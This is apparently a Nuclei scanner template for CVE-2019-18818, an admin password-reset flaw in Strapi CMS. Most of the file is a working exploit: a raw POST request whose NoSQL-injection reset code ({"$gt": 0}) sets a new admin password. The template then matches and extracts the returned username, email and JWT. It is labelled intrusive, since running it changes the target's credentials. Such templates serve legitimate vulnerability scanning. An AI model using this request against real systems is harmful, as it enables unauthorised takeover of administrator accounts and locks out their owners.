id: CVE-2019-18818
info:
  author: idealphase
  classification:
    cve-id: CVE-2019-18818
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-640
  description: strapi CMS before 3.0.0-beta.17.5 allows admin password resets because
    it mishandles password resets within packages/strapi-admin/controllers/Auth.js
    and packages/strapi-plugin-users-permissions/controllers/Auth.js.
  name: strapi CMS <3.0.0-beta.17.5 - Admin Password Reset
  reference:
  - https://github.com/advisories/GHSA-6xc2-mj39-q599
  - https://www.exploit-db.com/exploits/50239
  - https://nvd.nist.gov/vuln/detail/CVE-2019-18818
  - https://github.com/strapi/strapi/releases/tag/v3.0.0-beta.17.5
  severity: critical
  tags: cve,cve2019,strapi,auth-bypass,intrusive
requests:
- extractors:
  - json:
    - .user.username
    - .user.email
    type: json
  matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - '"username":'
    - '"email":'
    - '"jwt":'
  matchers-condition: and
  raw:
  - 'POST /admin/auth/reset-password HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/json


    {"code": {"$gt": 0}, "password": "SuperStrongPassword1", "passwordConfirmation":
    "SuperStrongPassword1"}

    '
